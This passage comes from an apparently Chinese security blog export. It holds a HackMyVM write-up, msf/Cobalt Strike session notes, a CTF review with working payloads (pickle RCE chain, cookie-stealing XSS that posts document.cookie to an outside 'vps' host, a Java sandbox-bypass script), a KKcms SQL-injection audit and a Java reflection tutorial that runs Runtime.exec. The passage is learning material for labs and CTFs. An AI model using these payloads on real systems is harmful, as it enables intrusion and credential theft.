08:00:27:5f:2f:1e       PCS Systemtechnik GmbH\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)\n192.168.31.217  b4:0f:b3:8e:31:07       vivo Mobile Communication Co., Ltd.\n\n5 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.995 seconds (128.32 hosts/sec). 5 responded\n~~~\n\nip地址为192.168.31.200，然后nmap扫描开放的端口\n\n~~~shell\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.200 --min-rate=1000\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 00:40 EST\nNmap scan report for gift (192.168.31.200)\nHost is up (0.0080s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:5F:2F:1E (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.96 seconds\n~~~\n\n只开启了22和80端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# curl http://192.168.31.200/\n\nDont Overthink. Really, Its simple.\n        <!-- Trust me -->\n~~~\n\n目录扫描也只有一个index.html,80端口没有入口点，只能找22端口,用hydra爆破root密码\n\n~~~\n[22][ssh] host: 192.168.31.200   login: root   password: simple\n~~~\n\n# SSH登录\n\nssh root@192.168.31.200\n\n能直接查看root.txt和user.txt\n\n\n\n# 总结\n\nDont Overthink. Really, Its simple.，Easy靶场,hydra直接爆破没什么好说的\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"记红日靶场2过程中的不足","url":"/2024/11/11/记红日靶场2过程中的不足/","content":"\n\n\n\n\n\n\n# msf派生cs\n\n~~~\n#msf\nbackground\nuse exploit/windows/local/payload_inject\nset payload windows/meterpreter/reverse_http\nset DisablePayloadHandler true\nset lhost 192.168.116.131\nset lport 9000\nset session 2\nrun\n~~~\n\ncs的监听要和lport的端口一样\n\n# cs派生msf\n\n~~~\n#msf\nbackground\nuse payload payload/windows/meterpreter/reverse_http\nset lhost 192.168.116.131\nset lport 9001\nrun\n~~~\n\ncs新建一个foreing http监听设置和msf的设置一样，然后cs新建会话到这个监听器即可。\n\n---\n\n其实不止这么多，包括进程迁移，票据之类的一个cs全部搞定了就，但是我还是想尝试一下怎么用纯手动打靶而且打靶环境过于理想完全没有考虑过流量特征的问题，有机会了补一篇，内网的学习路漫漫。\n\n","tags":["内网"],"categories":["内网渗透"]},{"title":"2024强网拟态复盘","url":"/2024/10/21/2024强网拟态复盘/","content":"\n\n\n\n\nweb复盘一下吧只做出来了两道，所有题都有一点思路，但是只有一点点可惜可惜，太可惜了。\n\n# capoo\n\n这是个非预期，capoo.php可以任意文件读取，能读取到start.sh,start.sh中泄露了flag的名字，直接读取就行\n\n# ez_picker\n\n~~~python\n#源码\nfrom sanic import Sanic\nfrom sanic.response import json,file as file_,text,redirect\nfrom sanic_cors import CORS\nfrom key import secret_key\nimport os\nimport pickle\nimport time\nimport jwt\nimport io\nimport builtins\napp = Sanic(\"App\")\npickle_file = \"data.pkl\"\nmy_object = {}\nusers = []\n\nsafe_modules = {\n    'math',\n    'datetime',\n    'json',\n    'collections',\n}\n\nsafe_names = {\n    'sqrt', 'pow', 'sin', 'cos', 'tan',\n    'date', 'datetime', 'timedelta', 'timezone', \n    'loads', 'dumps',  \n    'namedtuple', 'deque', 'Counter', 'defaultdict'\n}\n\nclass RestrictedUnpickler(pickle.Unpickler):\n    def find_class(self, module, name):\n        if module in safe_modules and name in safe_names:\n            return getattr(builtins, name)\n        raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" %(module, name))\n    \ndef restricted_loads(s):\n    return RestrictedUnpickler(io.BytesIO(s)).load()\n\nCORS(app, supports_credentials=True, origins=[\"http://localhost:8000\", \"http://127.0.0.1:8000\"])\nclass User:\n    def __init__(self,username,password):\n        self.username=username\n        self.password=password\n        \n\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\ndef token_required(func):\n    async def wrapper(request, *args, **kwargs):\n        token = request.cookies.get(\"token\")  \n        if not token:\n            return redirect('/login')\n        try:\n            result=jwt.decode(token, str(secret_key), algorithms=['HS256'], options={\"verify_signature\": True})\n        except jwt.ExpiredSignatureError:\n            return json({\"status\": \"fail\", \"message\": \"Token expired\"}, status=401)\n        except jwt.InvalidTokenError:\n            return json({\"status\": \"fail\", \"message\": \"Invalid token\"}, status=401)\n        print(result)\n        if result[\"role\"]!=\"admin\":\n            return json({\"status\": \"fail\", \"message\": \"Permission Denied\"}, status=401)\n        return await func(request, *args, **kwargs)\n    return wrapper\n\n@app.route('/', methods=[\"GET\"])\ndef file_reader(request):\n    file = \"app.py\"\n    with open(file, 'r') as f:\n        content = f.read()\n    return text(content)\n\n@app.route('/upload', methods=[\"GET\",\"POST\"])\n@token_required\nasync def upload(request):\n    if request.method==\"GET\":\n        return await file_('templates/upload.html')\n    if not request.files:\n        return text(\"No file provided\", status=400)\n\n    file = request.files.get('file')\n    file_object = file[0] if isinstance(file, list) else file\n    try:\n        new_data = restricted_loads(file_object.body)\n        try:\n            my_object.update(new_data)\n        except:\n            return json({\"status\": \"success\", \"message\": \"Pickle object loaded but not updated\"})\n        with open(pickle_file, \"wb\") as f:\n            pickle.dump(my_object, f)\n\n        return json({\"status\": \"success\", \"message\": \"Pickle object updated\"})\n    except pickle.UnpicklingError:\n        return text(\"Dangerous pickle file\", status=400)\n    \n@app.route('/register', methods=['GET','POST'])\nasync def register(request):\n    if request.method=='GET':\n        return await file_('templates/register.html')\n    if request.json:\n        NewUser=User(\"username\",\"password\")\n        merge(request.json, NewUser)\n        users.append(NewUser)\n    else:\n        return json({\"status\": \"fail\", \"message\": \"Invalid request\"}, status=400)\n    return json({\"status\": \"success\", \"message\": \"Register Success!\",\"redirect\": \"/login\"})\n\n@app.route('/login', methods=['GET','POST'])\nasync def login(request):\n    if request.method=='GET':\n        return await file_('templates/login.html')\n    if request.json:\n        username = request.json.get(\"username\")\n        password = request.json.get(\"password\")\n        if not username or not password:\n            return json({\"status\": \"fail\", \"message\": \"Username or password missing\"}, status=400)\n        user = next((u for u in users if u.username == username), None)\n        if user:\n            if user.password == password:\n                data={\"user\":username,\"role\":\"guest\"}\n                data['exp'] = int(time.time()) + 60 *5\n                token = jwt.encode(data, str(secret_key), algorithm='HS256')\n                response = json({\"status\": \"success\", \"redirect\": \"/upload\"})\n                response.cookies[\"token\"]=token\n                response.headers['Access-Control-Allow-Origin'] = request.headers.get('origin')\n                return response\n            else:\n                return json({\"status\": \"fail\", \"message\": \"Invalid password\"}, status=400)\n        else:\n            return json({\"status\": \"fail\", \"message\": \"User not found\"}, status=404)\n    return json({\"status\": \"fail\", \"message\": \"Invalid request\"}, status=400)\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\", port=8000)\n~~~\n\n考点就是原型链污染+pickle反序列化+jwt伪造，我当时感觉最难的是那个pickle反序列化，因为他是白名单虽然可以通过原型链污染进行修改但是这是由于对原理以及内建模块的不熟悉导致的，其实只需要把用到的模块和命令加入就行比如`builtins`、`getattr`、`popen`加入就好了\n\n~~~python\n#污染链\n{\"__init__\":{\n        \"__globals__\":{\n            \"secret_key\":\"66666\",\n            \"safe_modules\":[\"os\"],\n            \"safe_names\":[\"eval\"],\n        }\n    }\n}\n~~~\n\n~~~python\n#pickle链\nb'''(cos\neval\nS'os.system(\\\"calc\\\")'\no.'''\n~~~\n\n# Spreader\n\n~~~js\n# app.js\nconst express = require('express');\nconst session = require('express-session');\nconst stringRandom = require('string-random');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst port = 3000;\nconst AdminPassWord=stringRandom(16, { numbers: true })\nconst PrivilegedPassWord=stringRandom(16, { numbers: true })\nconst PlainPassWord=stringRandom(16, { numbers: true })\nconst secret_key=stringRandom(16, { numbers: true })\nconst users = [];\nconst posts = [];\nconst store = [];\nusers.push({ username:\"admin\", password:AdminPassWord, role: \"admin\" });\nusers.push({ username:\"privileged\", password:PrivilegedPassWord, role: \"privileged\" });\nusers.push({ username:\"plain\", password:PlainPassWord, role: \"plain\" });\nconsole.log(users)\napp.use(express.static('views'));\napp.set('view engine', 'ejs');\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(session({\n    secret: secret_key,\n    resave: false,\n    saveUninitialized: true,\n    cookie: {\n        httpOnly: false,\n        secure: false,\n    }\n}));\n\n\napp.use('/', require('./index')(users,posts,store,AdminPassWord,PrivilegedPassWord));\n\napp.listen(port, () => {\n    console.log(`App is running on http://localhost:${port}`);\n});\n\n~~~\n\n~~~js\n#bot.js\nconst puppeteer = require('puppeteer');\n\nasync function triggerXSS(UserName, PassWord) {\n    const browser = await puppeteer.launch({\n        args: ['--no-sandbox', '--disable-setuid-sandbox'],\n        executablePath: '/usr/bin/chromium',\n        headless: true\n    });\n\n    const page = await browser.newPage();\n\n    await page.goto('http://localhost:3000/login');\n\n    await page.type('input[name=\"username\"]', UserName);\n    await page.type('input[name=\"password\"]', PassWord);\n\n    await page.click('button[type=\"submit\"]');\n\n    await page.goto('http://localhost:3000/');\n\n    await browser.close();\n\n    return;\n}\n\nmodule.exports = { triggerXSS };\n\n~~~\n\n~~~js\n#index.js\nconst fs = require('fs');\nconst express = require('express');\nconst router = express.Router();\nconst { triggerXSS } = require('../bot');\nconst { Store } = require('express-session');\nfunction isAuthenticated(req, res, next) {\n    if (req.session.user) {\n        next();\n    } else {\n        res.redirect('/login');\n    }\n}\nmodule.exports = (users,posts,store,AdminPassWord,PrivilegedPassWord) => {\n\n    const ROLES = {\n        PLAIN: \"plain\",\n        PRIVILEGED: \"privileged\",\n        ADMIN: \"admin\",\n    };\n\n    router.get('/register', (req, res) => {\n        res.sendFile('register.html', { root: './views' });\n    });\n\n    router.post('/register', (req, res) => {\n        const { username, password, role } = req.body;\n        const userExists = users.some(u => u.username === username);\n        if (userExists) {\n            return res.send('Username already exists!');\n        }\n        users.push({ username, password, role: \"plain\" });\n        res.redirect('/login');\n    });\n    router.get('/login', (req, res) => {\n        res.sendFile('login.html', { root: './views' });\n    });\n\n    router.post('/login', (req, res) => {\n        const { username, password } = req.body;\n        console.log(username);\n        console.log(password);\n        const user = users.find(u => u.username === username && u.password === password);\n        if (user) {\n            req.session.user = user;\n            res.redirect('/');\n        } else {\n            res.send('Invalid credentials!');\n        }\n    });\n    router.get('/', isAuthenticated, (req, res) => {\n        const currentUser = req.session.user;\n        let filteredPosts = [];\n        if (currentUser.role === ROLES.ADMIN) {\n            filteredPosts = posts.filter(p => p.role === ROLES.PRIVILEGED || p.role === ROLES.ADMIN);\n        } else if (currentUser.role === ROLES.PRIVILEGED) {\n            filteredPosts = posts.filter(p => p.role === ROLES.PLAIN || p.role === ROLES.PRIVILEGED);\n        } else {\n            filteredPosts = posts.filter(p => p.role === ROLES.PLAIN);\n        }\n        res.render(`${currentUser.role}`, { posts: filteredPosts, user: currentUser });\n    });\n    router.post('/post', isAuthenticated, (req, res) => {\n        let { content } = req.body;\n    \n        const scriptTagRegex = /<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi;\n        content = content.replace(scriptTagRegex, '[XSS attempt blocked]');\n\n        const eventHandlerRegex = /on\\w+\\s*=\\s*([\"']).*?\\1/gi;\n        content = content.replace(eventHandlerRegex, '[XSS attempt blocked]');\n    \n        const javascriptURLRegex = /(?:href|src)\\s*=\\s*([\"'])\\s*javascript:.*?\\1/gi;\n        content = content.replace(javascriptURLRegex, '[XSS attempt blocked]');\n    \n        const dataURLRegex = /(?:href|src)\\s*=\\s*([\"'])\\s*data:.*?\\1/gi;\n        content = content.replace(dataURLRegex, '[XSS attempt blocked]');\n    \n        const cssExpressionRegex = /style\\s*=\\s*([\"']).*?expression\\([^>]*?\\).*?\\1/gi;\n        content = content.replace(cssExpressionRegex, '[XSS attempt blocked]');\n    \n        const dangerousTagsRegex = /<\\/?(?:iframe|object|embed|link|meta|svg|base|source|form|input|video|audio|textarea|button|frame|frameset|applet)[^>]*?>/gi;\n        content = content.replace(dangerousTagsRegex, '[XSS attempt blocked]');\n    \n        const dangerousAttributesRegex = /\\b(?:style|srcset|formaction|xlink:href|contenteditable|xmlns)\\s*=\\s*([\"']).*?\\1/gi;\n        content = content.replace(dangerousAttributesRegex, '[XSS attempt blocked]');\n    \n        const dangerousProtocolsRegex = /(?:href|src)\\s*=\\s*([\"'])(?:\\s*javascript:|vbscript:|file:|data:|filesystem:).*?\\1/gi;\n        content = content.replace(dangerousProtocolsRegex, '[XSS attempt blocked]');\n    \n        const dangerousFunctionsRegex = /\\b(?:eval|alert|prompt|confirm|console\\.log|Function)\\s*\\(/gi;\n        content = content.replace(dangerousFunctionsRegex, '[XSS attempt blocked]');\n    \n        posts.push({ content: content, username: req.session.user.username, role: req.session.user.role });\n        res.redirect('/');\n    });\n    \n    \n    router.get('/logout', (req, res) => {\n        req.session.destroy();\n        res.redirect('/login');\n    });\n    router.get('/report_admin', async (req, res) => {\n        try {\n            await triggerXSS(\"admin\",AdminPassWord);\n            res.send(`Admin Bot successfully logged in.`);\n        } catch (error) {\n            console.error('Error Reporting:', error);\n            res.send(`Admin Bot successfully logged in.`);\n        }\n    });\n    router.get('/report_privileged', async (req, res) => {\n        try {\n            await triggerXSS(\"privileged\",PrivilegedPassWord);\n            res.send(`Privileged Bot successfully logged in.`);\n        } catch (error) {\n            console.error('Error Reporting:', error);\n            res.send(`Privileged Bot successfully logged in.`);\n        }\n    });\n    router.get('/store', async (req, res) => {\n        return res.status(200).json(store);\n    });\n    router.post('/store', async (req, res) => {\n        if (req.body) {\n            store.push(req.body);\n            return res.status(200).send('Data stored successfully');\n        } else {\n            return res.status(400).send('No data received');\n        }\n    });\n    router.get('/flag', async (req, res) => {\n        try {\n            if (req.session.user && req.session.user.role === \"admin\") {\n                fs.readFile('/flag', 'utf8', (err, data) => {\n                    if (err) {\n                        console.error('Error reading flag file:', err);\n                        return res.status(500).send('Internal Server Error');\n                    }\n                    res.send(`Your Flag Here: ${data}`);\n                });\n            } else {\n                res.status(403).send('Unauthorized!');\n            }\n        } catch (error) {\n            console.error('Error fetching flag:', error);\n            res.status(500).send('Internal Server Error');\n        }\n    });\n    return router;\n};\n\n~~~\n\n这个题一眼xss嘛，然后有两种解题思路，一个是插入js代码利用/store路由，然后访问/report_privileged将privilege用户的cookie储存到/store中，然后同样的步骤再来一次获取admin的cookie\n\n~~~js\n<script>fetch('/store',{body:\"''p\"+`rivileged_cookie''=`+encodeURIComponent(document.cookie),method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'}})</script\n>\n~~~\n\n或者就是直接弹出privilege和admin的cookie\n\n~~~\n<img src=\"\" onerror=document.location='http://vps:port?cookie='+document.cookie />\n~~~\n\n# OnlineRunner\n\n这道题没有办法用import的方式来导入类，能执行命令的都不能用，反射也没有办法直接执行命令，看别的师傅是要绕过一个沙箱\n\n[探索Java RASP Bypass新姿势](https://vidar-team.feishu.cn/docx/AUvRdig4roPFOuxRvxAcpT81n9b)\n\n这里我还是有点懵，直接贴别的师傅的payload\n\n~~~java\nString[] files = {\"/proc/net/tcp\", \"/proc/net/tcp6\"};\n        for (int f = 0; f < files.length; f++) {\n            try {\n                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.FileReader(files[f]));\n                String line;\n                reader.readLine(); // Skip header line\n                while ((line = reader.readLine()) != null) {\n                    line = line.trim();\n                    String[] parts = line.split(\"\\\\s+\");\n                    if (parts.length > 3) {\n                        String local_address = parts[1];\n                        String state = parts[3];\n                        // State 0A means LISTEN\n                        if (state.equals(\"0A\")) {\n                            String[] addrPort = local_address.split(\":\");\n                            String ipHex = addrPort[0];\n                            String portHex = addrPort[1];\n                            String ip = \"\";\n                            if (files[f].endsWith(\"tcp6\")) {\n                                // IPv6 address parsing\n                                StringBuilder ipBuilder = new StringBuilder();\n                                for (int i = ipHex.length(); i > 0; i -= 8) {\n                                    String segment = ipHex.substring(Math.max(i - 8, 0), i);\n                                    StringBuilder segBuilder = new StringBuilder();\n                                    for (int j = segment.length(); j > 0; j -= 2) {\n                                        segBuilder.append(segment.substring(j - 2, j));\n                                    }\n                                    ipBuilder.insert(0, segBuilder.toString());\n                                    if (i > 8) {\n                                        ipBuilder.insert(0, \":\");\n                                    }\n                                }\n                                ip = ipBuilder.toString();\n                            } else {\n                                // IPv4 address parsing\n                                StringBuilder ipBuilder = new StringBuilder();\n                                for (int i = ipHex.length(); i > 0; i -= 2) {\n                                    String part = ipHex.substring(i - 2, i);\n                                    int num = Integer.parseInt(part, 16);\n                                    ipBuilder.insert(0, num);\n                                    if (i > 2) {\n                                        ipBuilder.insert(0, \".\");\n                                    }\n                                }\n                                ip = ipBuilder.toString();\n                            }\n                            int port = Integer.parseInt(portHex, 16);\n                            System.out.println(\"Listening on \" + ip + \":\" + port);\n                        }\n                    }\n                }\n                reader.close();\n            } catch (java.io.IOException e) {\n                System.out.println(e);\n            }\n        }\ntry {\n            java.net.URL url = new java.net.URL(\"http://127.0.0.1:46461/sandbox/default/module/http/sandbox-control/shutdown\");\n            java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            java.io.BufferedReader reader = new java.io.BufferedReader(\n                new java.io.InputStreamReader(connection.getInputStream())\n            );\n            String line;\n            StringBuilder response = new StringBuilder();\n            while ((line = reader.readLine()) != null) {\n                response.append(line).append(\"\\n\");\n            }\n            reader.close();\n            connection.disconnect();\n            System.out.println(response.toString()); System.out.println(connection.getResponseCode());\n        } catch (java.io.IOException e) {\n            System.out.println(e);\n        }\n try {\n            String command = \"/readflag\"; // Use \"dir\" on Windows\n            java.lang.Process process = java.lang.Runtime.getRuntime().exec(command);\n            java.io.BufferedReader reader = new java.io.BufferedReader(\n                new java.io.InputStreamReader(process.getInputStream())\n            );\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n/*try{\n\njava.io.File folder = new java.io.File(\"/home\");\n        if (!folder.isDirectory()) {\n            System.out.println(\"Provided path is not a folder\");\n            return;\n        }\n        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();\n        java.util.zip.ZipOutputStream zos = new java.util.zip.ZipOutputStream(baos);\n        java.util.Stack<java.io.File> stack = new java.util.Stack<java.io.File>();\n        stack.push(folder);\n        while (!stack.isEmpty()) {\n            java.io.File currentFile = stack.pop();\n            if (currentFile.isDirectory()) {\n                java.io.File[] fileList = currentFile.listFiles();\n                if (fileList != null) {\n                    for (int i = 0; i < fileList.length; i++) {\n                        stack.push(fileList[i]);\n                    }\n                }\n            } else {\n                java.io.FileInputStream fis = new java.io.FileInputStream(currentFile);\n                String zipEntryName = currentFile.getAbsolutePath().substring(folder.getAbsolutePath().length() + 1);\n                zos.putNextEntry(new java.util.zip.ZipEntry(zipEntryName));\n                byte[] buffer = new byte[1024];\n                int length;\n                while ((length = fis.read(buffer)) > 0) {\n                    zos.write(buffer, 0, length);\n                }\n                fis.close();\n                zos.closeEntry();\n            }\n        }\n        zos.close();\n        byte[] zipBytes = baos.toByteArray();\n        StringBuilder hexString = new StringBuilder();\n        for (int i = 0; i < zipBytes.length; i++) {\n            String hex = Integer.toHexString(0xff & zipBytes[i]);\n            if (hex.length() == 1) hexString.append('0');\n            hexString.append(hex);\n        }\n        System.out.println(hexString.toString());\n\n}catch(Exception e){System.out.println(e);}*/\n~~~\n\n~~~\n#读取文件\n\ntry {                  \n    java.io.File file = new java.io.File(\"/home/ctf/sandbox/lib/sandbox-agent.jar\"); // 需要读取的二进制文件     \n    java.io.BufferedInputStream bis = new java.io.BufferedInputStream(new java.io.FileInputStream(file));                  \n            byte[] buffer = new byte[1024]; // 创建一个字节数组作为缓冲区                  \n            int bytesRead;                       \n            while ((bytesRead = bis.read(buffer)) != -1) { // 循环读取                  \n                // 处理读取的数据（这里可以进行打印、处理等）                  \n                //System.out.write(buffer, 0, bytesRead);                  \nSystem.out.print('\"');                  \n                System.out.print(java.util.Base64.getEncoder().encodeToString(buffer));                  \nSystem.out.println(\"\\\",\");                  \n\t      }                                   \n        } catch (                  \njava.io.IOException e) {                  \n            e.printStackTrace();                  \n        }\n~~~\n\n其实比赛的时候想过用base64将文件编码读取，但是因为数据过大导致网页卡死了就没有继续想过了\n\n---\n\n唉，还得继续学，太菜了\n","tags":["ctf"],"categories":["ctf","复盘"]},{"title":"KKcms代审","url":"/2024/10/15/KKcms代审/","content":"\n\n\n# 环境安装\n\n源码下载地址：https://github.com/erichuang2015/kkcms\n\nphp5.6 .9+mysql5.7.26+apache2.4.39\n\n# 审计\n\n### 验证码复用\t\n\n![](/pic/kkcms/verify1.png)\n\n~~~javascript\n<img src=\"../system/verifycode.php\" onclick=\"javascript:this.src='../system/verifycode.php?'+Math.random()\" style=\"cursor:pointer;\" alt=\"点击更换\" title=\"点击更换\" />\n~~~\n\n这串代码用来执行js代码更换验证码，但是bp它默认不加载js，所以造成了验证码复用。\n\n~~~php\n<?php\nsession_start();\n$image = imagecreate(50, 34);\n$bcolor = imagecolorallocate($image, 0, 0, 0);\n$fcolor = imagecolorallocate($image, 255, 255, 255);\n$str = '0123456789';\n$rand_str = '';\nfor ($i = 0; $i < 4; $i++){\n\t$k = mt_rand(1, strlen($str));\n\t$rand_str .= $str[$k - 1];\n}\n$_SESSION['verifycode'] = $rand_str;\nimagefill($image, 0, 0, $bcolor);\nimagestring($image, 7, 7, 10, $rand_str, $fcolor);\nheader('content-type:image/png');\nimagepng($image);\n?>\n\n~~~\n\nverifycode.php的代码，就是生成一个随机的4位0-9的图片验证码\n\n### 文件上传\n\n这个cms默认用的编辑器是KindEditor,版本是4.1.10，构造payload\n\n~~~\n<html><form enctype=\"multipart/form-data\" action=\"http://127.0.0.1/editor/php/upload_json.php\" method=\"post\"> Upload a new file:<br> <input type=\"file\" name=\"imgFile\" size=\"50\"><br> <input type=\"submit\" value=\"Upload\"> </form></html>\n~~~\n\n可以直接上传文件，但是没什么用。\n\n![](/pic/kkcms/upload1.png)\n\n而且他有白名单，只能上传指定的后缀文件。\n\n### 前台sql注入\n\n在`template\\wapian\\vlist.php`这里\n\n![](/pic/kkcms/sql1.png)\n\n我们可以看到他没有任何的防护，但其实是有防护的,vlist.php里包含了system/inc.php,而inc.php中有一个转义的函数\n\n![](/pic/kkcms/sql2.png)\n\n\n\n但是这里为什么可以注入呢？是因为这里是数字型注入，没有用双引号包裹，自然也不用双引号进行闭合，addslashes也就没起上作用,放进sqlmap里就可以跑出来。\n\n![](/pic/kkcms/sql3.png)\n\n### 前台sql注入2\n\n在ucenter\\reg.php里\n\n![](/pic/kkcms/sql4.png)\n\n这里为什么可以注入呢？这里是因为他有一个stripslashes函数，它会删除由addslashes添加上的斜杠，放进sqlmap里跑\n\n![](/pic/kkcms/sql5.png)\n\n也是可以跑出来盲注。搜索stripslashes关键字，可以找到repass.php和active.php同样有注入。\n\n### 后台sql注入\n\n在cms_usergroup_edit.php处\n\n![](/pic/kkcms/sql6.png)\n\n修改会员级别处有盲注，但是sql跑不出来不知道为什么。然后和此处一样的还有cms_ad_edit.php、cms_admin_edit.php、cms_book_edit.php、cms_channel_edit.php\n\n还有一处\n\n![](/pic/kkcms/sql7.png)\n\n这里有delete注入，整个后台的delete语句全是这样写的。\n\n---\n\nXSS漏洞就不审计了，这个cms就这样吧，一个比较简单的cms。\n","tags":["web","代码审计"],"categories":["代码审计"]},{"title":"java反射","url":"/2024/05/31/java反射/","content":"\n\n\n## 什么是反射\n\n反射是大多数语言都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将 Java 这种静态语⾔附加上动态特性。\n\n## Java反射组成相关的类\n\njava.lang.Class：类对象;\n\njava.lang.reflect.Constructor：类的构造器对象;\n\njava.lang.reflect.Field：类的属性对象;\n\njava.lang.reflect.Method：类的方法对象;\n\n## 实例化对象的方法\n\n#### 实例化对象的getClass()方法\n\n如果上下⽂中存在某个类的实例 `obj`，那么我们可以通过 `obj.getClass` 来获取它的类。\n\n#### 使用类的 .class 方法\n\n如果你已经加载了某个类，只是想获取到它的 `java.lang.Class` 对象，那么就直接拿它的 `class` 属性即可。这个⽅法其实不属于反射。\n\n#### Class.forName(String className)：动态加载类\n\n如果你知道某个类的名字，想获取到这个类，就可以使⽤ `forName` 来获取，后续要利用的话是需要实例化的。\n\n## 获取成员变量Field\n\n获取成员变量Field位于 `java.lang.reflect.Field` 包中\n\nField[] getFields() ：获取所有 public 修饰的成员变量\n\nField[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符\n\nField getField(String name) 获取指定名称的 public 修饰的成员变量\n\nField getDeclaredField(String name) 获取指定的成员变量\n\n##  获取成员方法 Method\n\n~~~java\nMethod getMethod(String name, 类<?>... parameterTypes) //返回该类所声明的public方法\n\nMethod getDeclaredMethod(String name, 类<?>... parameterTypes) //返回该类所声明的所有方法\n\n//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型\n\nMethod[] getMethods() //获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法\n\nMethod[] getDeclaredMethods() // 获取该类中的所有方法\n~~~\n\n## 获取构造函数 Constructor\n\n~~~JAVA\nConstructor<?>[] getConstructors() ：只返回public构造函数\n\nConstructor<?>[] getDeclaredConstructors() ：返回所有构造函数\n\nConstructor<> getConstructor(类<?>... parameterTypes) : 匹配和参数配型相符的public构造函数\n\nConstructor<> getDeclaredConstructor(类<?>... parameterTypes) ： 匹配和参数配型相符的构造函数\n~~~\n\n## 命令执行\n\n获取 class 实例 之后\n\n- 获取类名：`forName()`\n- 创建对应类型的实例：`newInstance()`\n- 获取字段的值：`get()`、设置字段的值：`set()`\n- 获取方法：`getMethod()`、调用方法：`invoke()`\n\n---\n\n基本知识就是这些，如何执行命令呢，举个例子\n\n~~~java\npackage src;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\npublic class FinalReflectionCalc {\n    public static void main(String[] args) throws Exception{\n        Class c1 = Class.forName(\"java.lang.Runtime\");//创建一个runtime的方法\n        Method c2 = c1.getDeclaredMethod(\"getRuntime\");//获取getRuntime的方法\n        c2.setAccessible(true);//使getRuntime可访问，因为getRuntime是私有属性\n        Object o1 = c2.invoke(null);//调用静态方法，无需实例\n        Method m1 = c1.getDeclaredMethod(\"exec\",String.class);//获取exec方法\n        m1.invoke(o1,\"calc\");//弹计算器\n    }\n}\n~~~\n\n这是调用静态方法，不需要实例\n\n当然也可以实现一个新实例\n\n~~~java\npackage src;\n\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\npublic class FinalReflectionCalc {\n    public static void main(String[] args) throws Exception{\n        Class c1 = Class.forName(\"java.lang.Runtime\");//获取Runtime的Class对象\n        Constructor c2=c1.getDeclaredConstructor();//获取Runtime类的无参构造函数\n        c2.setAccessible(true);//使getRuntime可访问\n        Object c3=c2.newInstance();//创建Runtime的新实例\n        Method exec = c1.getDeclaredMethod(\"exec\", String.class);\n        exec.invoke(c3,\"calc\");//弹计算器\n\n    }\n}\n~~~\n\n[Java反序列化基础篇-02-Java反射与URLDNS链分析](https://drun1baby.top/2022/05/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-02-Java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE%E5%88%86%E6%9E%90/#0x08-%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E5%BC%B9%E8%AE%A1%E7%AE%97%E5%99%A8)参考链接，写的很清晰\n\n[Java反射](https://www.cnblogs.com/noKing/p/9038234.html#/)\n\n---\n\n## Java反射修改字段\n\n### private\n\n~~~Java\npackage src;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\npublic class PrivateReflect {\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException {\n        Class c = Class.forName(\"src.PrivatePerson\");\n        Object m = c.newInstance();\n        Method PrintMethod = c.getDeclaredMethod(\"printName\");\n        PrintMethod.invoke(m);\n        Field nameField = c.getDeclaredField(\"name\");\n        nameField.setAccessible(true);\n        nameField.set(m, new StringBuilder(\"aaaaa\"));\n        PrintMethod.invoke(m);\n    }\n}\n~~~\n\n~~~java\npackage src;\n\npublic class PrivatePerson {\n    private StringBuilder name = new StringBuilder(\"lll\");\n\n    public void printName() {\n        System.out.println(name);\n    }\n}\n~~~\n\nstatic单独出现的话，用getDeclaredField也可以\n\n~~~java\npackage src;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\npublic class PrivateReflect {\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException {\n        Class c = Class.forName(\"src.PrivatePerson\");\n        Object m =c.newInstance();\n        Method f = c.getDeclaredMethod(\"printName\");\n        f.invoke(m);\n        Field ff=c.getDeclaredField(\"name\");\n        ff.setAccessible(true);\n        ff.set(m,new 